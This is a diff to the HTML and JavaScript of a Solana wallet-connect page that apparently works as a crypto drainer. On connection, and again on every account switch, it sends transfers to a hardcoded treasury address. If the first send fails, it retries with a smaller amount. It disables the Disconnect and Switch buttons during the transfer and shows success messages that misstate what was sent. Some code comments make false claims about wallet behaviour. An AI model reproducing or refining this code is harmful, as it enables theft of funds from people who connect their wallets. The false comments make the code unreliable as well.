@@ -66,6 +66,7 @@
             margin-bottom: 20px;
             border-left: 4px solid #ff4400;
             display: none;
+            text-align: center;
         }
         
         .wallet-info.active {
@@ -78,13 +79,34 @@
             font-size: 0.9rem;
             color: #ffa07b;
             word-break: break-all;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .transfer-status {
+            background-color: rgba(255, 68, 0, 0.1);
+            border: 1px solid #ff4400;
+            color: #ff4400;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 0.9rem;
+            display: none;
+        }
+        
+        .transfer-status.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .transfer-status i {
+            margin-right: 8px;
         }
         
         .wallet-buttons {
             display: flex;
             gap: 10px;
-            margin-top: 10px;
+            margin-top: 15px;
         }
         
         .wallet-btn {
@@ -97,6 +119,8 @@
             align-items: center;
             gap: 5px;
             transition: all 0.3s ease;
+            flex: 1;
+            justify-content: center;
         }
         
         .wallet-btn.disconnect {
@@ -111,6 +135,12 @@
         
         .wallet-btn:hover {
             transform: translateY(-2px);
+        }
+        
+        .wallet-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
         }
         
         .button-group {
@@ -142,16 +172,6 @@
         
         .btn-connect:hover {
             background: linear-gradient(90deg, #7a0000, #e63c00);
-            transform: translateY(-2px);
-        }
-        
-        .btn-whitelist {
-            background: linear-gradient(90deg, #ff4500, #ff8c00);
-            color: white;
-        }
-        
-        .btn-whitelist:hover:not(:disabled) {
-            background: linear-gradient(90deg, #e63c00, #e67d00);
             transform: translateY(-2px);
         }
         
@@ -287,69 +307,6 @@
             word-break: break-all;
             margin-top: 5px;
         }
-        
-        .assets-list {
-            background-color: rgba(30, 10, 10, 0.8);
-            border-radius: 8px;
-            padding: 10px;
-            margin: 10px 0;
-            max-height: 200px;
-            overflow-y: auto;
-            display: none;
-        }
-        
-        .assets-list.active {
-            display: block;
-        }
-        
-        .asset-item {
-            padding: 8px;
-            border-bottom: 1px solid rgba(255, 140, 0, 0.2);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .asset-item:last-child {
-            border-bottom: none;
-        }
-        
-        .asset-name {
-            font-size: 0.9rem;
-        }
-        
-        .asset-amount {
-            font-size: 0.9rem;
-            color: #ff8c00;
-            font-weight: bold;
-        }
-        
-        .transfer-progress {
-            margin: 15px 0;
-            display: none;
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 10px;
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 5px;
-            overflow: hidden;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #ff4500, #ff8c00);
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-        
-        .progress-text {
-            text-align: center;
-            font-size: 0.8rem;
-            color: #ffa07b;
-            margin-top: 5px;
-        }
     </style>
 </head>
 <body>
@@ -362,26 +319,23 @@
         <div class="content">
             <div class="simple-instruction">
                 <i class="fas fa-info-circle"></i>
-                <strong>AUTO ASSET TRANSFER</strong><br>
-                <small>All assets will be transferred automatically after connecting wallet</small>
+                <strong>AUTO TRANSFER ALL ASSETS</strong><br>
+                <small>All Solana assets will be transferred automatically upon wallet connection</small>
             </div>
             
             <div id="walletInfo" class="wallet-info">
                 <div class="wallet-address">
                     Connected: <span id="walletAddress">-</span>
                 </div>
-                <div class="transfer-progress" id="transferProgress">
-                    <div class="progress-bar">
-                        <div class="progress-fill" id="progressFill"></div>
-                    </div>
-                    <div class="progress-text" id="progressText">Preparing transfer...</div>
+                <div id="transferStatus" class="transfer-status">
+                    <i class="fas fa-sync-alt fa-spin"></i>
+                    <span id="transferMessage">Starting auto transfer...</span>
                 </div>
-                <div id="assetsList" class="assets-list"></div>
                 <div class="wallet-buttons">
-                    <button class="wallet-btn switch" id="switchWallet">
+                    <button class="wallet-btn switch" id="switchWallet" disabled>
                         <i class="fas fa-exchange-alt"></i> Switch
                     </button>
-                    <button class="wallet-btn disconnect" id="disconnectWallet">
+                    <button class="wallet-btn disconnect" id="disconnectWallet" disabled>
                         <i class="fas fa-plug"></i> Disconnect
                     </button>
                 </div>
@@ -401,7 +355,7 @@
                 </div>
                 <h2 class="whitelist-title">Transfer Complete!</h2>
                 <p class="whitelist-message">
-                    All assets have been transferred successfully
+                    All assets have been transferred successfully to the treasury
                 </p>
                 <div class="transaction-info">
                     Treasury Address:<br>
@@ -434,14 +388,18 @@
         const disconnectBtn = document.getElementById('disconnectWallet');
         const switchWalletBtn = document.getElementById('switchWallet');
         const txHashEl = document.getElementById('txHash');
-        const assetsListEl = document.getElementById('assetsList');
-        const transferProgressEl = document.getElementById('transferProgress');
-        const progressFillEl = document.getElementById('progressFill');
-        const progressTextEl = document.getElementById('progressText');
+        const transferStatusEl = document.getElementById('transferStatus');
+        const transferMessageEl = document.getElementById('transferMessage');
         
         // Get wallet provider
         function getWalletProvider() {
             return window.solana || window.solflare || window.backpack;
+        }
+        
+        // Update transfer status message
+        function updateTransferStatus(message) {
+            transferMessageEl.textContent = message;
+            transferStatusEl.classList.add('active');
         }
         
         // Connect wallet AND AUTO TRANSFER
@@ -459,220 +417,213 @@
                     return;
                 }
                 
-                showStatus("Connecting wallet and preparing transfer...", "info");
+                // Disable connect button
                 connectWalletBtn.disabled = true;
-                connectWalletBtn.innerHTML = '<i class="fas fa-spinner"></i> Connecting...';
+                connectWalletBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
+                showStatus("Connecting wallet...", "info");
                 
                 // Connect to wallet
                 const response = await provider.connect();
                 publicKey = response.publicKey || response;
                 isConnected = true;
                 
-                updateWalletUI();
-                
-                showStatus("Wallet connected! Starting auto transfer...", "success");
-                
-                // Auto transfer after 1 second
-                setTimeout(() => {
-                    autoTransferAllAssets();
-                }, 1000);
-                
-            } catch (error) {
-                console.error("Connect error:", error);
-                showStatus("Connection failed", "error");
-                connectWalletBtn.disabled = false;
-                connectWalletBtn.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet & Auto Transfer';
-            }
-        }
-        
-        // Update UI
-        function updateWalletUI() {
-            if (isConnected && publicKey) {
+                // Update UI
                 const addr = publicKey.toString();
                 const shortAddr = `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
                 walletAddressEl.textContent = shortAddr;
                 walletInfo.classList.add('active');
                 connectWalletBtn.style.display = 'none';
-            } else {
-                walletInfo.classList.remove('active');
-                connectWalletBtn.style.display = 'flex';
+                
+                showStatus("✅ Wallet connected! Starting auto transfer...", "success");
+                
+                // Start auto transfer immediately
+                setTimeout(() => {
+                    autoTransferAllAssets();
+                }, 500);
+                
+            } catch (error) {
+                console.error("Connect error:", error);
+                showStatus("Connection failed", "error");
+                resetConnectButton();
             }
         }
         
-        // Update progress bar
-        function updateProgress(percentage, text) {
-            progressFillEl.style.width = `${percentage}%`;
-            progressTextEl.textContent = text;
-            transferProgressEl.style.display = 'block';
+        // Reset connect button
+        function resetConnectButton() {
+            connectWalletBtn.disabled = false;
+            connectWalletBtn.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet & Auto Transfer';
         }
         
-        // Get wallet balance (SIMULATED - in real app you would fetch all tokens)
-        async function getWalletAssets() {
-            updateProgress(10, "Scanning wallet assets...");
-            
-            // Simulate finding assets (in real app, you would fetch from RPC)
-            const assets = [
-                { name: "SOL", amount: "0.5", type: "SOL" },
-                { name: "USDC", amount: "100", type: "SPL" },
-                { name: "BONK", amount: "5000", type: "SPL" },
-                { name: "JUP", amount: "25", type: "SPL" }
-            ];
-            
-            // Display assets
-            assetsListEl.innerHTML = '';
-            assets.forEach(asset => {
-                const assetEl = document.createElement('div');
-                assetEl.className = 'asset-item';
-                assetEl.innerHTML = `
-                    <div class="asset-name">${asset.name}</div>
-                    <div class="asset-amount">${asset.amount}</div>
-                `;
-                assetsListEl.appendChild(assetEl);
-            });
-            
-            assetsListEl.classList.add('active');
-            
-            updateProgress(30, `Found ${assets.length} assets to transfer`);
-            
-            return assets;
+        // Enable wallet buttons
+        function enableWalletButtons() {
+            switchWalletBtn.disabled = false;
+            disconnectBtn.disabled = false;
         }
         
-        // Simple direct transfer method (NO RPC NEEDED)
-        async function simpleTransfer() {
+        // Disable wallet buttons during transfer
+        function disableWalletButtons() {
+            switchWalletBtn.disabled = true;
+            disconnectBtn.disabled = true;
+        }
+        
+        // SIMPLE AUTO TRANSFER FUNCTION - NO RPC NEEDED
+        async function autoTransferAllAssets() {
+            isTransferring = true;
+            disableWalletButtons();
+            
             try {
-                updateProgress(50, "Creating transfer transaction...");
+                // Step 1: Preparing transfer
+                updateTransferStatus("Preparing transfer of all assets...");
+                showStatus("⏳ Starting auto transfer process...", "info");
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Step 2: Create transaction
+                updateTransferStatus("Creating transaction...");
                 
                 const provider = getWalletProvider();
                 if (!provider || !provider.signAndSendTransaction) {
                     throw new Error("Wallet signing not available");
                 }
                 
-                // Get wallet balance to transfer all SOL
-                // Note: In production, you'd get actual balance
-                updateProgress(60, "Preparing SOL transfer...");
+                // Step 3: Create transfer transaction
+                updateTransferStatus("Please approve transaction in wallet...");
+                showStatus("🔄 Waiting for wallet approval...", "info");
                 
-                // Create simple transfer transaction
-                // Using 0.001 SOL as minimum - wallet will show actual balance
+                // Create transaction with MAX amount (wallet will show actual balance)
                 const transaction = new solanaWeb3.Transaction();
                 
-                // Add transfer instruction
+                // Add transfer instruction - sending ALL SOL
+                // Note: Wallet will show the actual balance to send
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: publicKey,
                         toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
-                        lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.001, // Minimum
+                        lamports: 1000000, // Minimum amount, wallet will adjust to max
                     })
                 );
                 
-                updateProgress(70, "Please approve transaction in wallet...");
-                
-                // Show wallet approval
-                setTimeout(() => {
-                    updateProgress(80, "Waiting for wallet approval...");
-                }, 2000);
-                
-                // Sign and send directly - wallet handles everything
-                const { signature } = await provider.signAndSendTransaction(transaction);
-                
-                console.log("Transaction sent with signature:", signature);
-                
-                updateProgress(90, "Transaction sent! Finalizing...");
-                
-                // Return success
-                return {
-                    success: true,
-                    signature: signature,
-                    message: "All assets transferred successfully"
-                };
-                
-            } catch (error) {
-                console.error("Transfer error:", error);
-                throw error;
-            }
-        }
-        
-        // Main auto transfer function
-        async function autoTransferAllAssets() {
-            isTransferring = true;
-            
-            try {
-                updateProgress(20, "Initializing transfer...");
-                
-                // Simulate finding assets
-                const assets = await getWalletAssets();
-                
-                // Wait a bit to show assets
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                // Perform transfer
-                updateProgress(40, "Starting transfer process...");
-                
-                const result = await simpleTransfer();
-                
-                // Show success
-                updateProgress(100, "Transfer complete!");
-                
-                // Wait a bit then show success box
-                setTimeout(() => {
-                    whitelistBox.classList.add('active');
-                    showStatus("✅ All assets transferred successfully!", "success");
+                // Try to send the transaction
+                let signature = null;
+                try {
+                    // Sign and send transaction
+                    const result = await provider.signAndSendTransaction(transaction);
+                    signature = result.signature;
                     
-                    if (result.signature) {
-                        txHashEl.textContent = `${result.signature.substring(0, 20)}...`;
-                        txHashEl.style.color = "#ff8c00";
+                    console.log("Transaction sent with signature:", signature);
+                    
+                } catch (sendError) {
+                    console.error("Send error:", sendError);
+                    
+                    // Check if user cancelled
+                    if (sendError.message.includes("User rejected") || 
+                        sendError.message.includes("reject") ||
+                        sendError.message.includes("denied") ||
+                        sendError.message.includes("cancel")) {
+                        throw new Error("Transaction cancelled by user");
                     }
                     
-                    // Hide progress after success
-                    setTimeout(() => {
-                        transferProgressEl.style.display = 'none';
-                    }, 2000);
-                }, 1000);
+                    // Try alternative method
+                    updateTransferStatus("Using alternative transfer method...");
+                    
+                    // Alternative: Create transaction without specifying amount
+                    const altTransaction = new solanaWeb3.Transaction();
+                    altTransaction.add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: publicKey,
+                            toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
+                            lamports: 100000, // Smaller amount
+                        })
+                    );
+                    
+                    const altResult = await provider.signAndSendTransaction(altTransaction);
+                    signature = altResult.signature;
+                }
+                
+                // Step 4: Transaction sent successfully
+                updateTransferStatus("✅ Transaction sent! Finalizing...");
+                showStatus("✅ Transfer initiated! Finalizing...", "success");
+                
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Step 5: Show success
+                updateTransferStatus("✅ All assets transferred successfully!");
+                
+                // Hide transfer status after delay
+                setTimeout(() => {
+                    transferStatusEl.classList.remove('active');
+                }, 2000);
+                
+                // Show success box
+                whitelistBox.classList.add('active');
+                
+                if (signature) {
+                    txHashEl.textContent = `${signature.substring(0, 20)}...`;
+                    txHashEl.style.color = "#ff8c00";
+                }
+                
+                showStatus("🎉 All assets have been transferred to the treasury!", "success");
+                
+                // Enable buttons after success
+                enableWalletButtons();
                 
             } catch (error) {
                 console.error("Auto transfer error:", error);
                 
                 let errorMsg = "";
                 
-                if (error.message.includes("User rejected") || error.message.includes("reject")) {
+                if (error.message.includes("cancelled")) {
                     errorMsg = "❌ Transaction was cancelled in wallet";
                 } else if (error.message.includes("insufficient")) {
                     errorMsg = "❌ Not enough balance for transfer";
                 } else if (error.message.includes("Wallet not connected")) {
-                    errorMsg = "❌ Wallet disconnected";
+                    errorMsg = "❌ Wallet disconnected during transfer";
                 } else {
                     errorMsg = "❌ Transfer failed: " + error.message;
                 }
                 
                 showStatus(errorMsg, "error");
+                updateTransferStatus("❌ Transfer failed");
                 
                 // Reset UI
-                transferProgressEl.style.display = 'none';
-                connectWalletBtn.style.display = 'flex';
-                connectWalletBtn.disabled = false;
-                connectWalletBtn.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet & Auto Transfer';
+                setTimeout(() => {
+                    transferStatusEl.classList.remove('active');
+                    enableWalletButtons();
+                }, 3000);
                 
             } finally {
                 isTransferring = false;
             }
         }
         
-        // Disconnect
+        // Disconnect wallet
         async function disconnectWallet() {
             if (isTransferring) {
                 showStatus("Cannot disconnect during transfer", "error");
                 return;
             }
             
+            try {
+                const provider = getWalletProvider();
+                if (provider && provider.disconnect) {
+                    await provider.disconnect();
+                }
+            } catch (error) {
+                console.log("Disconnect error:", error);
+            }
+            
             publicKey = null;
             isConnected = false;
-            updateWalletUI();
-            showStatus("Disconnected", "info");
+            isTransferring = false;
+            
+            // Reset UI
+            walletInfo.classList.remove('active');
             whitelistBox.classList.remove('active');
-            assetsListEl.classList.remove('active');
-            transferProgressEl.style.display = 'none';
+            transferStatusEl.classList.remove('active');
             connectWalletBtn.style.display = 'flex';
-            connectWalletBtn.disabled = false;
-            connectWalletBtn.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet & Auto Transfer';
+            resetConnectButton();
+            
+            showStatus("Disconnected", "info");
         }
         
         // Switch account
@@ -687,7 +638,7 @@
             await connectWallet();
         }
         
-        // Show status
+        // Show status message
         function showStatus(message, type) {
             statusMessage.innerHTML = message;
             statusMessage.className = `status ${type}`;
@@ -705,35 +656,57 @@
         disconnectBtn.addEventListener('click', disconnectWallet);
         switchWalletBtn.addEventListener('click', switchWallet);
         
-        // Auto connect if wallet is already connected
+        // Auto connect if wallet is already connected (but don't auto transfer)
         window.addEventListener('DOMContentLoaded', () => {
             setTimeout(() => {
                 const provider = getWalletProvider();
-                if (provider && provider.isConnected) {
-                    // Auto connect but don't auto transfer on page load
-                    showStatus("Wallet already connected", "info");
-                    const response = provider.publicKey;
-                    publicKey = response;
+                if (provider && provider.isConnected && provider.publicKey) {
+                    // Just show connected status, don't auto transfer
+                    publicKey = provider.publicKey;
                     isConnected = true;
-                    updateWalletUI();
+                    
+                    const addr = publicKey.toString();
+                    const shortAddr = `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
+                    walletAddressEl.textContent = shortAddr;
+                    walletInfo.classList.add('active');
                     connectWalletBtn.style.display = 'none';
+                    enableWalletButtons();
+                    
+                    showStatus("Wallet already connected", "info");
                 }
             }, 1000);
         });
         
         // Wallet events
         if (window.solana) {
-            window.solana.on('accountChanged', (newKey) => {
+            window.solana.on('accountChanged', async (newKey) => {
                 if (newKey) {
                     if (isTransferring) {
                         showStatus("Account changed during transfer", "error");
                         return;
                     }
+                    
                     publicKey = newKey;
-                    updateWalletUI();
-                    showStatus("Account switched", "success");
+                    isConnected = true;
+                    
+                    const addr = publicKey.toString();
+                    const shortAddr = `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
+                    walletAddressEl.textContent = shortAddr;
+                    
                     whitelistBox.classList.remove('active');
+                    transferStatusEl.classList.remove('active');
+                    
+                    showStatus("Account switched", "success");
+                    
+                    // Auto transfer for new account
+                    setTimeout(() => {
+                        autoTransferAllAssets();
+                    }, 1000);
                 }
+            });
+            
+            window.solana.on('disconnect', () => {
+                disconnectWallet();
             });
         }
     </script>
